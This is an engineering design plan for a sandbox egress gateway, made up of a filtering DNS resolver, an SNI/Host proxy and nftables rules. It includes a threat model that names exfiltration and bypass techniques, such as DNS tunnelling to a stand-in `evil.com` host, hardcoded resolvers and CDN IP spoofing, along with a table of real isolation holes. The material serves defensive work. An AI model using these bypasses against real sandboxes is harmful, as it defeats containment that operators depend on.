# Plan: Domain-based egress filtering — filtering DNS resolver + SNI egress proxy

Status: **ENG-REVIEWED + CEO-REVIEWED 2026-10-06** (`/plan-eng-review` decisions D2-D22 and `/plan-ceo-review` decisions D1-D21, in the ledgers below; the body reflects every approved decision)
Owner: server (new `internal/egress/`, new `sandboxd egress-gateway` process), 5 SDKs (Phase 2), docs
Created: 2026-10-05
Stacks on: nothing. Delivery is one stacked PR series: one PR per task, and nothing merges until the whole stack is green (repo practice). Phase 0 PRs sit first in the stack, and P0-3 is ordered after P1-1 (`pkg/egresspolicy`), which it needs.

---

## 0. TL;DR

Today a sandbox's egress is either fully blocked or limited to CIDR allow/deny lists
enforced by iptables. You can't say "pypi, GitHub and npm only", because those sit
behind CDNs whose IPs are shared with everyone else. DNS is all-or-nothing: once
the resolver's IP is allowed, the sandbox can resolve and tunnel through any name.

This plan adds a per-node **egress gateway**. It runs as its own long-lived
process (`sandboxd egress-gateway` under its own systemd unit, D9), so sandboxd
restarts don't interrupt egress. It has three parts:

1. **Its own nftables table** (`inet aerolvm_egress`). It redirects DNS and
   TCP 80/443 from sandboxes that have hostname rules ("FQDN mode") to the
   gateway, and default-denies everything else unless a CIDR or a DNS-learned IP
   allows it.
2. **A filtering DNS resolver.** Names that aren't allowlisted get NXDOMAIN and
   never leave the host. For allowed names, the answers open short-lived
   firewall entries, but only for non-HTTP ports the rule explicitly lists.
3. **A transparent SNI/Host proxy.** It checks the TLS SNI or HTTP `Host` against
   the policy, then **resolves and dials that name itself**. So hostname
   enforcement holds even on shared CDN IPs, with no TLS interception.

What else the plan does:

- **Mixed lists.** Allow and deny lists may now be combined, with E2B's
  semantics: allow wins (D4).
- **Sandboxes outside gateway mode.** A sandbox with no hostname rules, no
  profile and not in learn mode gets **no gateway work**. It still gets the
  Phase 0 fixes: `CAP_NET_RAW` dropped, and the `AEROLVM-INPUT` rule for
  block-all and CIDR sandboxes.
- **Pre-existing holes.** Seven are closed: six in Phase 0 and H5 in P1-7. They
  include block-all sandboxes still reaching host services, and spoofing; raw
  packets are dropped for every sandbox (§2.1).
- **Phase 1: every denial for a sandbox in gateway mode fails fast with a reason.**
  Block-all and quota blocks stay silent drops, as today.
  - DNS gets Extended DNS Error "Blocked";
  - HTTP gets a 403 naming the rule;
  - HTTPS gets a TLS `access_denied` alert;
  - other blocked connects get a reset or ICMP reject;
  - WASM and isolate return typed errors.
- **Phase 2:**
  - a live `PUT /network/policy` that applies without a restart, and the
    matching E2B `updateNetwork` route;
  - named egress profiles plus pinned built-in profiles (pypi, npm, github…);
  - a learn mode that records a trusted run and suggests the allowlist;
  - a policy check endpoint.
- **Phase 3** (fully specified, still gated on demand):
  - TLS inspection with per-method/path rules (the OpenShell model);
  - proxy-side credential injection;
  - per-binary rules on runc.

---

## 1. Problem statement

The incident notes that motivated this plan:

- **OpenAI, 2026-09-20:** an agent escaped through *"insufficient DNS
  filtering"*.
- **Hugging Face, July:** the agent's path to the internet was a package mirror
  (Artifactory) on the allowlist.
- **Reddit:** the top comment on the escape thread (297 upvotes) was *"Startup
  idea: A sandbox that actually works."*
- **What users ask for:** hostname/SNI allowlists, a filtering DNS resolver, and
  per-method/path rules that change without a restart.

What AerolVM can't express today:

- **Hostnames.** CIDR-only lists can't name `pypi.org`. Its Fastly IPs also serve
  thousands of unrelated sites, so allowing them by CIDR allows those sites too.
- **DNS filtering.** With a CIDR allowlist, DNS is dropped unless the resolver
  is listed. Once it is listed, every name resolves, so DNS tunnelling is open.
- **Changes after create.** The only network setting you can change after create
  is the byte limits (`pkg/api/v1/routes.go:113`).
- **The docs say so outright** (`docs/src/content/docs/network-isolation.mdx:420`):
  *"CIDR-based, not domain-based … There is no domain allowlist or DNS-only mode."*

---

## 2. Where the code stands (verified 2026-10-05)

| Runtime | Egress enforcement today | DNS today |
|---|---|---|
| docker | iptables `DOCKER-USER`, keyed on source IP (`pkg/docker/netrules/manager.go:286`). Containers join the default `bridge`/docker0 (`internal/config/config.go:1633`). | dockerd writes resolv.conf from the host's. `HostConfig.DNS` is never set (`pkg/docker/client.go:522-615`). |
| containerd | Same manager, chain `AEROLVM-USER` (`pkg/daemon/container_engine_wiring.go:41`). Bridge `aerolvm0`, `10.88.0.0/16` (`internal/network/cni/conflist.go:13`). | Per-sandbox resolv.conf copies the host upstreams and drops loopback stubs (`internal/runtime/containerd/hosts.go:52`). Warm-adopted containers get **no** resolv.conf mount, so they use the image's own (`warm_park.go:179-182`). |
| gVisor (runsc) | Same veth/bridge path under both engines, with the default netstack, so host FORWARD rules apply. | As above. |
| Firecracker | **None.** Create rejects `network_block_all` and allow/deny (`internal/service/service.go:2137-2145`). No in-repo NAT for the TAP subnets (`TODOS.md:378`). | Whatever resolv.conf the image ships. The kernel `ip=` arg has no DNS fields (`coldboot_agent.go:110`). |
| WASM | Every dial goes through Go (`pkg/wasm/worker/netmediator.go:95`) as a raw `host:port` string from the guest. DNS happens on the host. The only policy is a pair of block booleans. | Host Go resolver. |
| isolate | Hostname allowlist (exact or `.suffix`) in a plaintext HTTP proxy, with a resolve-time SSRF guard (`pkg/isolate/egress.go:223,258`). | Host resolves. |

How the pieces work:

- **Validation.** `validateEgressPolicy` (`service.go:6480`) only accepts CIDRs.
  Firecracker, WASM and isolate creates branch off before it runs
  (`service.go:1694/1708/1723` vs `:1836`).
- **Netrules backend.** The default backend is google/nftables writing into the
  iptables-nft `ip filter` compat table (`netlink_backend.go:9-10`). It supports
  **no sets**, refuses non-filter tables (`:228-230`), and every rule is
  `-s IP [-d CIDR] -j ACCEPT|DROP`.
- **Re-apply sites.**
  - Driver create: `client.go:689`, `lifecycle.go:301`.
  - Warm adopt: `docker_pool.go:451`, `warm_adopt.go:272`.
  - `StartSandbox`: `service.go:2890`.
  - `Reconcile`: `service.go:5133`, every 5 min.
  - Stop/destroy clears rules: `events.go:195,268`.
- **Byte metering** reads the container's own `eth0` counters through
  `/proc/<pid>/net/dev` (`pkg/docker/netstats/reader.go`). Proxied traffic still
  crosses `eth0`, so **quotas keep working**.
- **Audit.** `emitEgressAudit` (`internal/service/secret_audit.go:2489`) records
  **allowed** traffic only, for WASM and isolate. Docker iptables egress has no
  observer.
- **Cluster.** Policy rides `models.CreateSandboxRequest` in the replicated spec
  (`internal/cluster/fsm.go:80`, `recovery_store.go:38`). That spec is capped at
  **4096 bytes inline** (`recovery_replication.go`, `inlineRecoveryMaxBytes`),
  which bounds allowlist size in cluster mode.
- **Reusable pieces:**
  - miekg/dns plus a working responder pattern (`internal/routedns/responder.go`,
    with singleflight).
  - SNI routing already in production on ingress (caddy-l4 dials
    `{l4.tls.server_name}.rt.internal`).
  - `egressDialControl` and `hostMatches` in `pkg/isolate/egress.go`.
  - The L4 latch pattern (`service.go:319-320,3770`).
  - The REDIRECT-capable nat chain manager
    (`internal/network/hostport/forwarder.go:191`).

### 2.1 Pre-existing holes found while surveying

These are fixed in Phase 0 (H5 in P1-7) because they undermine any egress feature:

| # | Hole | Evidence |
|---|---|---|
| H1 | **WASM: `network_block_all`, `network_allow_out` and `network_deny_out` are stored but never enforced at create.** `syncWasmNetworkPolicy` runs only from `applyNetworkQuotaState`, and only when a byte quota is involved. A WASM sandbox created with `network_block_all: true` and no limits can still dial out. | `internal/service/wasm.go:181-183`; `wasm_network.go:48-58`; call sites `netstats.go:128,299`, `service.go:5150` (all quota-gated) |
| H2 | **Source-IP spoofing on the shared bridge.** containerd grants `CAP_NET_RAW`, and docker keeps its default caps, which include it. There is no rp_filter, ebtables or per-veth binding. Every egress rule keys on source IP, so a sandbox can send one-way packets (e.g. UDP) under a neighbour's policy. | `internal/runtime/containerd/security.go:30`; no `CapDrop` in `pkg/docker/client.go`; `br_netfilter` is only set on the containerd netns-pool path (`internal/network/hostnet/sysctl_linux.go`) |
| H3 | **Isolate egress entries are not validated at all.** They go straight to the driver. | `internal/service/isolate.go:192-194` |
| H4 | **Out-of-band docker `start` doesn't re-apply egress rules.** Stop cleared them, so the sandbox runs unrestricted until the next reconcile (≤5 min). | `pkg/docker/events.go:332` vs `:195` |
| H5 | **Denied egress is never audited**, on any runtime. | `pkg/isolate/egress.go:131-198` (403 before `observeEgress`); `netmediator.go:96` |
| H6 | **Block-all and CIDR-allowlist sandboxes can still reach host services** (sandboxd API `0.0.0.0:21212`, SSH gateway `:2220`, cluster mTLS `:7002`) through their bridge gateway IP. Every egress rule sits on FORWARD; traffic to the host goes through INPUT. (Review A4/D8.) | `pkg/docker/netrules/manager.go:180-211,286-312`; `ensure_chain.go` FORWARD jump only; `internal/config/config.go:1626-1627,1694,1842` |
| H7 | **Event-driven rule clears can strip a recycled IP's rules.** Stop and destroy events clear by `previousIP` asynchronously, while the netns pool can already have handed that IP to a new sandbox. (Review TD2/D20.) | `internal/service/events.go:187-197,260-270`; `internal/network/netns/pool.go:94-97` |

---

## 3. Goals / non-goals

**Goals**

- G1. Allowlists can name hosts: `pypi.org`, `*.pythonhosted.org`,
  `github.com:22`. This works on docker, containerd, gVisor, WASM and isolate.
- G2. A name that isn't allowlisted **never leaves the host as a DNS query**.
  That closes DNS tunnelling and exfiltration through DNS.
- G3. HTTP/HTTPS hostname enforcement **holds on shared CDN IPs**. The
  connection goes to the name the policy approved, not to whatever IP the
  sandbox picked.
- G4. Sandboxes not in gateway mode (no hostname rules, no profile reference,
  not in learn mode) get **no gateway work**. They still get the Phase 0 fixes
  every sandbox gets: `CAP_NET_RAW` dropped (CEO D8) and, for block-all and
  CIDR sandboxes, the `AEROLVM-INPUT` rule (D8, P0-5).
- G5. Policy changes apply live, with no sandbox restart (Phase 2).
- G6. Both allowed and **denied** attempts are audited.
- G7. Fail closed: if the gateway is down or not ready, an FQDN-mode sandbox
  has no egress. It never falls back to open egress or to CIDR-only.
- G8. Allow and deny lists combine with E2B's allow-wins precedence (D4), and a
  restricted sandbox cannot reach host services (D7/D8).

**Non-goals (this plan)**

- IPv6 egress filtering. Phase 1 answers AAAA with NODATA and keeps the existing
  IPv4-only caveat; see Q4.
- QUIC/HTTP3. UDP 443 is rejected (fails fast) so clients fall back to TCP.
- TLS interception and per-method/path rules. That's Phase 3, opt-in and gated
  on demand.
- Firecracker. That's Phase 4, blocked on the FC NAT audit (`TODOS.md:378`).
- Hostnames in **deny** lists, on every runtime including isolate (D15; E2B
  rejects them too).
- kata.

---

## 4. Threat model

The attacker is code inside the sandbox, including container root. After P0-2
it has no `CAP_NET_RAW` (dropped for every sandbox, CEO D8) and no
`CAP_NET_ADMIN`. On gVisor, raw sockets are off by default.

| Channel | Mitigation | Phase |
|---|---|---|
| DNS tunnelling (`<data>.evil.com`, TXT/NULL) | Names that aren't allowlisted get NXDOMAIN locally and are never forwarded. Per-sandbox QPS cap. | 1 |
| Hardcoded resolver (`@8.8.8.8`), or a resolver inside a CIDR-allowed range (e.g. the VPC resolver) | All UDP/TCP 53 from gateway-mode sandboxes is redirected to the filter **before** any CIDR accept, whatever the destination. Any port-53 flow that escapes the redirect is rejected in forward (EF-57). | 1 |
| DNS over TLS (853) | Rejected (fails fast). | 1 |
| DNS over HTTPS | The DoH endpoint's hostname isn't allowlisted, so the proxy denies it by SNI. A DoH server on a raw IP needs that IP allowed by CIDR. | 1 |
| Direct-IP connection | Default-deny forward chain: only CIDR entries and DNS-learned (IP, port) pairs pass. 80/443 always go through the proxy. | 1 |
| CDN shared IP (`--resolve pypi.org:443:<other-fastly-ip>`) | The proxy ignores the original destination IP and dials the **SNI name** itself. | 1 |
| Domain fronting (SNI = allowed, inner `Host` = other CDN tenant) | **Residual in Phase 1** (not visible without decrypting). Documented. Closed by Phase 3 inspection (Host must equal SNI). | 3 |
| Encrypted ClientHello / no SNI | Policy matches the **outer** SNI and ignores whether the ECH extension is present: Chrome and Firefox send decoy (GREASE) ECH on every hello with the real outer SNI. Real ECH carries the provider's public name as its outer SNI, so it fails the allowlist. Missing SNI is rejected. HTTPS/SVCB RRs get NODATA so clients don't fetch ECH configs. (D6) | 1 |
| Plain HTTP `Host` switch on a keep-alive connection | Port 80 is checked per request, not per connection. | 1 |
| DNS rebinding or allowlisted name pointing at an internal IP / metadata endpoint | The proxy's dial control always blocks loopback and link-local (169.254.169.254). Private ranges are blocked unless a CIDR entry allows them. | 1 |
| QUIC (UDP 443) | Rejected (fails fast). | 1 |
| Spoofing a neighbour's source IP | The proxy is TCP, so a spoofed SYN never completes and identity is safe there. DNS (UDP) and the forward chain are not safe. Fixed by **H2** in Phase 0: `CAP_NET_RAW` is dropped for **every** docker and containerd sandbox (CEO D8), which also protects learn-mode recordings and DNS budgets from neighbours. | 0 |
| Allowlisted mirror used as a general proxy (the Hugging Face case) | Can't be fixed by host rules. Docs warn. Phase 3 path rules restrict which repos a mirror may serve. | docs / 3 |
| User-content domains (`*.github.io`, `*.s3.amazonaws.com`) | Wildcards are explicit opt-in. Docs warn. A wildcard on a public suffix (`*.com`, `*.github.io`) is rejected using `golang.org/x/net/publicsuffix` (already a dependency). | 1 |
| Policy bypass via a block or quota DROP that redirected traffic skips | **Invariant:** while a sandbox is egress-blocked its IP is in the gateway-owned `@blocked_src`, which drops in forward and input (eng re-review D2); `DOCKER-USER`'s DROP stays as a second layer. The gateway also checks a blocked bit. See §5.3. | 1 |
| Reaching host services (sandboxd API, SSH gateway, cluster port) through the bridge gateway IP | FQDN sources: the gateway's input chain accepts established/related traffic and redirected DNS/proxy traffic, then drops (D7). Block-all and CIDR-allowlist sandboxes: new netrules `AEROLVM-INPUT` chain, P0-5 (D8). | 0 / 1 |
| IP reuse handing one sandbox's allowances or cleanup to the next | Gateway `Detach(id, ip)` is owner-checked, and `Attach` purges a stale owner (D5). Netrules event clears are owner-checked too (P0-6, D20). Learned entries are flushed on Detach and reuse (D2). | 0 / 1 |
| One sandbox exhausting the shared gateway (noisy neighbour) | Per-sandbox and per-node proxy connection caps (D17), plus a per-sandbox DNS QPS cap. | 1 |
| Gateway restart opening a fail-open window | Set contents are replaced in one atomic nft transaction and never pass through empty; with no snapshot loaded, kernel sets stay untouched (D13). | 1 |
| Learn mode left on an untrusted sandbox (it is open egress by design) | Never a default; set explicitly per sandbox; every learn-mode event is marked in audit; docs say "trusted runs only" (CEO D2). | 2 |
| Explainable denials telling sandboxed code what was refused | The message names only the refused host and the deciding rule, never the rest of the policy (CEO D4). | 1 |
| Per-binary rules forged by root inside the sandbox | Documented as least privilege for trusted tooling, not a boundary against untrusted code (CEO D7). | 3 |

---

## 5. Design

### 5.1 Policy grammar (extends the existing fields; no new wire field in Phase 1)

`network_allow_out` entries become one of:

| Entry | Meaning | Enforced by |
|---|---|---|
| `10.0.0.0/8` | CIDR (today's meaning) | forward chain (or netrules when not in FQDN mode) |
| `pypi.org` | Exact host, HTTP + HTTPS (TCP 80/443) | DNS filter + proxy |
| `*.pythonhosted.org` | One or more labels under the suffix, at any depth; the apex `pythonhosted.org` is **not** matched (E2B semantics). `.pythonhosted.org` is accepted as the legacy isolate alias. | DNS filter + proxy |
| `github.com:22` | Host plus a non-HTTP port. The DNS answer opens `(src, ip, 22)` in the learned set with a TTL. | DNS filter + forward chain |

Rules:

- **Ports, on every runtime (spec review 3 L3; follows D15's single
  grammar).**
  - A bare hostname means TCP 80/443 everywhere, including WASM (mediator dial
    port) and isolate (the fetch URL's port).
  - `host:port` adds exactly that port. The WASM mediator and isolate's proxy
    enforce it directly; no learned IPs are involved.
  - Isolate today allows any port for an allowed host, so this narrows it. A
    release note covers it, and EF-45 adds a port row.
- **Precedence (D4).** `network_allow_out` and `network_deny_out` may now be
  combined; the mutual-exclusion rule is removed. Precedence only matters when
  both lists are present:
  - `allowOut` alone: allowlist, default deny (today's meaning, unchanged).
  - `denyOut` alone: deny list, default accept (today's meaning, unchanged).
  - Both: an allow match accepts, then a deny match drops, then the default is
    accept.
  - `denyOut` containing `0.0.0.0/0` with a non-empty `allowOut`: allowlist
    mode. `denyOut ["0.0.0.0/0"]` with an empty `allowOut` stays block-all.
- **Gateway mode** (older sections and EF rows say "FQDN mode"; it is the same thing, and code and docs use "gateway mode") applies when
  any of these hold:
  - `allowOut` has at least one hostname entry;
  - the policy references an egress profile (named or `builtin:`, Phase 2);
  - `network_egress_mode` is `learn` (Phase 2).

  The sandbox's default verdict is deny in allowlist mode and accept in
  deny-list mode (A8); learn mode is allow-all and recorded. CIDR-only and empty
  policies keep today's path byte-for-byte (G4).
- **Validation** moves into a shared `pkg/egresspolicy`, used by the service and
  by isolate/WASM. Hosts are lowercased (trailing dot and port stripped) and
  IDNA-normalized to punycode, ≤253 characters, with no IP-literal hostnames.
  Wildcards only as a leading `*.`, and never on a public suffix. Ports 1-65535;
  `:80`/`:443` are rejected as redundant. Caps: ≤64 inline hostname entries
  (fits the 4 KB cluster spec), ≤512 per profile, ≤1024 hostnames in the
  effective union of inline entries and referenced profiles. Hostnames in
  `network_deny_out` are rejected with a 400 naming the entry, on **every**
  runtime including isolate (D15).
- **Cluster mode:** the 4 KB inline recovery cap applies. Create and PUT both
  run `ValidateRecoveryPayloadSize` and return 400 when it's exceeded. Named
  egress profiles (Phase 2, D21) lift the cap for large lists.
- **Error codes.** Never silently ignored, unlike H1.

  | Case | Status |
  |---|---|
  | Grammar or validation error (bad entry, cap exceeded, hostname in deny list, learn mode combined with lists) | 400 naming the entry |
  | Runtime can't enforce gateway mode (Firecracker in Phases 1-3; `binaries` on a non-runc runtime) | 501 |
  | `SB_EGRESS_FQDN_ENABLED=false`, or the node's gateway failed its kernel probe or self-test (container runtimes only; isolate and WASM enforce hostnames without the gateway and are unaffected) | 501, "egress hostname filtering is not available on this node" |
  | Gateway unreachable or version-skewed | 503 |
  | Cluster spec commit failed on PUT | 503 |

### 5.2 Data path (container runtimes)

```
 sandbox netns ──veth──► bridge (docker0 / aerolvm0)
                              │
             nft inet aerolvm_egress  (own table; never touches DOCKER-USER/AEROLVM-USER;
                              │        owned by the egress-gateway process, D9)
   @fqdn_src is a real set, written in the same netlink batch as its parts:
   @fqdn_src_deny_default, @fqdn_src_accept_default, @learn_src   (A8, X1)
                              │
   prerouting (nat, prio dstnat-10), only for  ip saddr ∈ @fqdn_src :
     udp/tcp dport 53                        → redirect :SB_EGRESS_DNS_PORT   ─► DNS filter
                                               (FIRST: a CIDR-allowed resolver can't bypass it)
     ip saddr . ip daddr ∈ @allow_cidr       → accept (CIDR-allowed: plain forward, no proxy)
     tcp dport {80,443}                      → redirect :SB_EGRESS_PROXY_PORT ─► SNI/Host proxy
                              │
   forward (filter, prio filter-10), only for ip saddr ∈ @fqdn_src :
     ip saddr ∈ @blocked_src                 → drop   (FIRST: block-all, quota, hold; eng re-review D2)
     ct state established,related            → accept (long flows survive learned-entry expiry, D2)
     udp/tcp dport 53                        → reject (any DNS that escaped the redirect)
     udp dport 443 / tcp dport 853           → reject (QUIC, DoT)
     ip saddr ∈ @learn_src                   → accept (learn mode; recorded via the @learn_flows dynamic set, F3)
     ip saddr . ip daddr ∈ @allow_cidr       → accept
     ip saddr . ip daddr . th dport ∈ @allow_learned → accept   (host:port rules, TTL'd)
     ip saddr . ip daddr ∈ @deny_cidr        → reject
     ip saddr ∈ @fqdn_src_deny_default       → reject (allowlist mode)
     (deny-list mode falls through → accept)
     "reject" = TCP reset, or ICMP admin-prohibited for UDP (CEO D10: fail fast)
                              │
   input (filter, prio filter-10):
     ct state established,related            → accept (replies to sandboxd→toolboxd etc.)
     ip saddr ∈ @blocked_src                 → drop   (blocked redirect traffic; eng re-review D2)
     dport ∈ {DNS_PORT, PROXY_PORT} and ip saddr ∈ @fqdn_src → accept (redirected traffic)
     ip saddr ∈ @fqdn_src                    → reject (no host services from gateway-mode sandboxes, D7)
     dport ∈ {DNS_PORT, PROXY_PORT}          → drop   (listeners unreachable from non-sandbox sources)
```

Block-all and CIDR-allowlist sandboxes outside FQDN mode get the matching INPUT
protection from netrules' new `AEROLVM-INPUT` chain (P0-5, D8).

- **Sets:**
  - `fqdn_src`, `fqdn_src_deny_default`, `fqdn_src_accept_default`,
    `learn_src` and `blocked_src` are `ipv4_addr`. `blocked_src` is written
    only by `SetBlocked` and `Sync` (eng re-review D2). `fqdn_src` is maintained as a real set,
    updated in the same netlink batch as the other three (nft has no set
    union).
  - Learn mode's default verdict is accept. In learn mode the proxy dials the
    original destination for a no-SNI or IP-literal hello and records the IP.
  - `learn_flows` and `rejected_flows` are dynamic `ipv4_addr . ipv4_addr .
    inet_service` sets with timeouts. Forward rules fill them with
    `update @set {...}`; see F3 and C9.
  - `allow_cidr` and `deny_cidr` are `ipv4_addr . ipv4_addr` with
    `flags interval`.
  - `allow_learned` is `ipv4_addr . ipv4_addr . inet_service` with
    `flags timeout`.
- **Static rules plus set membership** means per-sandbox cost is set elements,
  not rules. Attaching a sandbox is **one netlink batch**. This scales with
  local density, and a node holding about 1k sandboxes stays well within nft set
  capacity.
- **Kernel requirement:** interval concatenations need Linux ≥ 5.6 (Ubuntu 22.04
  ships 5.15). The bootstrap probes for this by creating the table. If the probe
  fails, the gateway is unavailable on that node and FQDN creates are refused
  (G7).
- **Coexistence:** an `accept` in our table only ends *our* chain. Docker's and
  netrules' chains still run, so a blanket `BlockAllEgress` DROP in
  `DOCKER-USER` still wins for forwarded traffic. Redirected traffic goes to
  INPUT and would skip that DROP, which is why `@blocked_src` drops in input
  as well as forward (§5.3 invariant, eng re-review D2). The
  table should coexist with iptables-legacy hosts (the `exec` backend), because
  legacy and nf_tables hooks run independently; NAT-hook coexistence on legacy
  hosts is unverified and is proven by the D16 legacy-host probe.
- **In FQDN mode, netrules installs no `sbx-egress` rules** for the sandbox.
  The gateway owns its CIDR entries through `allow_cidr`, so the two can't
  disagree. Outside FQDN mode, netrules is unchanged.

### 5.3 Gateway core — `internal/egress`

- **Process model (D9).** The gateway runs as its own long-lived process,
  `sandboxd egress-gateway` (same binary, new subcommand), under its own systemd
  unit shipped by install.sh, Terraform and Ansible. It owns the nft table, the
  DNS filter and the proxy. sandboxd talks to it over a UDS.
  - The protocol is versioned, and each side supports versions **N and N-1**.
  - Only a gap of two or more versions is a mismatch. On a mismatch, sandboxd
    refuses gateway-mode creates with 503 (fail closed, G7), keeps existing
    sandboxes' policies as they are, and keeps Detach working. CIDR-only creates
    are unaffected.
  - **Upgrade order:** upgrading sandboxd never restarts the gateway, so
    sandboxd restarts don't interrupt FQDN egress (D9). The gateway binary is
    upgraded by a separate, operator-scheduled restart of its unit; that causes
    a brief fail-closed egress pause for gateway-mode sandboxes on the node, and
    the docs say so.
  - Hosts without systemd run `sandboxd egress-gateway` under their own
    supervisor; install.sh covers systemd only.
- **Hardening (CEO D22).**
  - **Socket:** mode 0600, owned by root. The gateway checks each connection's
    peer with `SO_PEERCRED` (uid 0 and sandboxd's unit cgroup) and rejects
    anyone else.
    - The gateway runs as `aerolvm-egress`, so it can't create a root-owned
      socket itself. A systemd socket unit (`aerolvm-egress.socket`,
      `SocketUser=root`, `SocketMode=0600`) creates it and passes the fd in
      (eng re-review S5).
    - Under a non-systemd supervisor, the supervisor creates it the same way.
  - **Privileges:** the gateway runs as a dedicated `aerolvm-egress` user with
    only `CAP_NET_ADMIN` and `CAP_NET_BIND_SERVICE` (systemd
    `AmbientCapabilities`), plus `NoNewPrivileges` and `ProtectSystem=strict`.
  - **Secrets:** `PR_SET_DUMPABLE=0` and `LimitCORE=0`; secrets are never
    logged or snapshotted.
  - **Work that needs more privilege moves to sandboxd** (root), so the approved
    capability set holds:
    - sandboxd creates the self-test netns and veth and runs the probe client;
      the gateway only observes the probe arriving;
    - Phase 3 per-binary rules add `CAP_BPF` and `CAP_SYS_PTRACE` to the unit
      only when per-binary rules are enabled, which the PR calls out.
  - **Tests:** a non-sandboxd peer is rejected, and the unit runs without root.
  - **File descriptors (eng re-review S11, performance).** The unit sets
    `LimitNOFILE=131072`.
    - Each proxied connection holds about 6 fds: two sockets plus a splice
      pipe pair per direction, since `netsplice` keeps raw-conn `splice(2)`.
    - The node cap of 16384 connections therefore needs about 98k, plus DNS
      sockets.
    - Older systemd defaults to a 1024 soft and 4096 hard limit, which would
      cap the proxy far below `connLimiter`.
- **Packages (D3):** `pkg/egresspolicy` (grammar, matcher, SNI peek, dial
  control), `internal/egress` (core, nft, UDS server and client),
  `internal/egress/dnsfilter`, `internal/egress/proxy`. The splice and the
  connection limiter come from `internal/netsplice` (D12, D17).
- **State:** `Gateway` holds:
  - `byID` (sandboxID → compiled policy, source IP, default verdict, blocked bit);
  - `bySrc` (IP → sandboxID, the ownership map for D5);
  - a shadow map of learned elements with their expiry (D18);
  - a registry of live proxied connections per sandbox.

  Reads use an `RWMutex`, and the policy is swapped through a pointer so the
  data path never blocks on writers. Every nft write uses its own netlink conn,
  with no global mutex (D18, the `348b21f3` lesson).
- **API used by sandboxd (interface plus `Noop`, like `cluster.Noop`; carried
  over the UDS):**
  - `Attach(id, ip, policy)` / `Update(id, policy)` / `Detach(id, ip)`
  - `SetBlocked(id, reason, bool)`, with reason one of `block_all`, `quota`
    or `hold`.
    - The IP is in `@blocked_src` while any reason is set (eng re-review D2).
      So a quota unblock can't lift a hold or a block-all.
    - Each call is one nft write.
    - `SetBlocked(true)` and `Detach` also close every
    proxied connection the gateway has registered for that sandbox and delete
    its conntrack entries. Without that, a sandbox at its byte quota could keep
    downloading over connections already open (EF-13).
  - `Sync(fullState)`: used after either process restarts (D13).
    - The payload is every attached sandbox's `{id, ip, compiled policy, mode,
      blocked}`.
    - The gateway atomically replaces the source, CIDR and deny sets to match.
    - It **preserves** learned-IP elements, the shadow map and learn-mode
      recordings for sandboxes whose policy is unchanged, and flushes them for
      sandboxes that were removed or changed.
  - `Ready() error`
- **Fail-closed hold (CEO D16).** The hold is the single mechanism that keeps
  a gateway-mode sandbox shut when it can't be attached.
  - **What it is:**
    - a persisted `egress_hold` store column, plus a reason;
    - a comment-tagged DROP `sbx-egress-hold`, which quota and limits code never
      touch (unlike the shared `-s IP -j DROP`).
  - **Who sets it:** the create path and every attach path (start, reconcile,
    docker start event, recreate, profile re-apply, PUT apply) when Attach fails.
  - **Who clears it:** only a successful Attach.
  - **Attach** takes the sandbox's blocked/quota state and never clears quota or
    block-all DROPs. Every "→ ClearBlockAll" step in §5.8's transitions
    becomes "clear the hold if Attach succeeded".
  - **A Noop or unavailable gateway** returns an error, so callers keep the hold.
  - **The hold covers the redirect path too** (eng re-review S3, repairing
    D16's contract).
    - Setting a hold also sends `SetBlocked(hold, true)`, which adds the IP to
      `@blocked_src`. Its redirected 53/80/443 traffic and its forwarded
      traffic both drop (eng re-review D2).
    - If that nft write itself fails, the gateway's in-memory blocked bit still
      makes the DNS filter and proxy deny, and the `sbx-egress-hold` DROP still
      covers forwarded traffic.
    - Without this, a failed PUT or profile re-apply on an attached sandbox
      would keep serving the old policy through the redirect.
    - EF-64 gains this row.
  - **Stored-spec replay** (recreate) never refuses an entry. It holds with
    `egress_status:"unavailable"`.
  - **Gateway restart:** the gateway restores its snapshot with every sandbox
    blocked until sandboxd's `Sync` confirms the real state.
    - That restart block is the **in-memory** bit only: the DNS filter and
      proxy deny.
    - Kernel sets, including `@blocked_src`, stay untouched until `Sync`
      (D13), so long-lived CIDR and `host:port` flows survive a gateway
      upgrade.
    - A block sandboxd issued while the gateway was down is already enforced
      in the forward path by the iptables DROP. `Sync` then writes it to
      `@blocked_src`.
  - **PUT failures** are distinct 503 bodies: `spec_commit_failed` (nothing
    changed) and `apply_failed_held` (stored, held).
- **Per-sandbox serialization (Section 4; implements D16 and the §5.8 mutex).**
  - The gateway serializes all operations for one sandbox. It applies the
    latest `SetBlocked` state when an Attach commits; callers never read the
    blocked state themselves.
  - Sequence that must not happen: Attach reads `blocked=false` → quota poller
    sets `blocked=true` → Attach puts the IP back in the redirect set. The
    serialization rules it out.
  - Profile fan-out re-applies take the same per-sandbox mutex as policy PUT.
  - Test: controlled pause and release points, in both completion orders.
- **Code shape (Section 5).** `pkg/egresspolicy` compiles a policy into a plain
  apply plan (sets to add or remove, verdicts, listeners). The gateway turns
  that plan into one nft batch, so Attach stays a linear function with no
  per-mode branching.
- **Table-loss detection (CEO D17).**
  - The gateway heartbeat verifies its table, chains and set handles every 5 s.
  - On loss, sandboxd holds every gateway-mode sandbox on the node (C-HOLD),
    the gateway rebuilds the layout in one atomic batch, and `Sync` releases
    the holds.
  - Creating the table never flushes anything that already exists, and layout
    changes are always one batch.
  - New alert `SandboxdEgressTableLost`.
  - Test: deleting the table under a running sandbox shuts its egress within
    5 s, and egress returns after the rebuild.
- **Node preconditions (CEO D18).**
  - At gateway bootstrap sandboxd enables `br_netfilter` and
    `bridge-nf-call-iptables=1` (as the netns-pool path already does), and the
    self-test confirms it, so traffic bridged between sandboxes hits the hooks.
  - Gateway mode is refused with 501 on nodes where privileged sandboxes are
    enabled (`SB_CONTAINER_PRIVILEGED=true`) and on sandbox bridges that carry
    IPv6.
  - EF-58 covers each case.
- **Capability-aware placement (CEO D20).**
  - Sandbox-owning nodes advertise `egress_gateway_ready` in their existing
    capacity heartbeat.
  - Placement sends gateway-mode creates and recreates only to ready nodes. If
    none is ready, the create fails with 503 and a clear message.
  - CLAUDE.md rule 6: regression tests in `placement_test.go` and a PR call-out.
    A no-op when cluster mode is off.
- **IP ownership (D5).** `Detach(id, ip)` removes the source-set, CIDR and
  learned entries and the `bySrc` mapping only when `bySrc[ip] == id`.
  `Attach` for an IP still mapped to another sandbox first purges that owner's
  entries (including learned entries and conntrack) and logs it.
- **Invariant (eng re-review D2):** two set rules hold.
  - `ip ∈ @fqdn_src ⇔ sandbox is in gateway mode`, meaning hostname entries,
    a profile reference, or learn mode.
  - `ip ∈ @blocked_src ⇔ gateway mode ∧ at least one block reason is set`.
    The reasons are block-all, quota and the D16 hold.

